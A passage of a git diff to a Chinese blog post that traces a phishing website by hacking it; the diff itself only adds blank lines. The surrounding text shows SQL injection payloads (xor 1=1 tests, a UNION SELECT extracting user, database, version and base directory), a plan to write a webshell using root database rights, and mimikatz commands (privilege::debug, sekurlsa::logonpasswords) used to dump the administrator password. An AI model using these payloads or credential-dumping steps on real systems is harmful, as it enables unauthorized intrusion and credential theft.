@@ -18,7 +18,9 @@ permalink: /archivers/Traceability-go-fishing-website-20180714
 
 看到链接下看到后缀php?uid=,初步判断应该是php+mysql的网站..复制链接到电脑浏览器打开后下意识职业病uid=87'
   ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714101207.png)
+  
   ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714101745.png)
+  
 ###1.2 爆出路径,可能存在sql注入
 得到路径D:\xxxxx\zz\index.php，加上header头数据初步判断得出是Windows+Apache+Php+Mysql的网站,能爆路径很概率会有Sql注入,我们先记录下来路径是D:\xxxxx\
 >http://www.xxxx.cn/zz/index.php?zt=1&uid=87 xor 1=1 //返回正常
@@ -60,6 +62,7 @@ permalink: /archivers/Traceability-go-fishing-website-20180714
 >@@version_compile_os 操作系统 
 
 >http://www.xxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,user(),database(),7,8,version(),10,11,12,@@basedir,14,15,16,17,18,19,20,21,22,23,24,25,26
+
 ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714122723.png)
 
 运气不错是root权限,不用大费周章跑去后台传马,直接写,记录信息root@localhost^^5.5.40^^xxxx^^D:/phpStudy/MySQL/
@@ -106,6 +109,7 @@ Ps:一定要是管理员权限才能运行.
 >privilege::debug
 >
 >sekurlsa::logonpasswords
+
 ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714135136.png)
 
 得到管理员administrator密码540cxxxxxx.把自己账号禁了,以管理员进去.
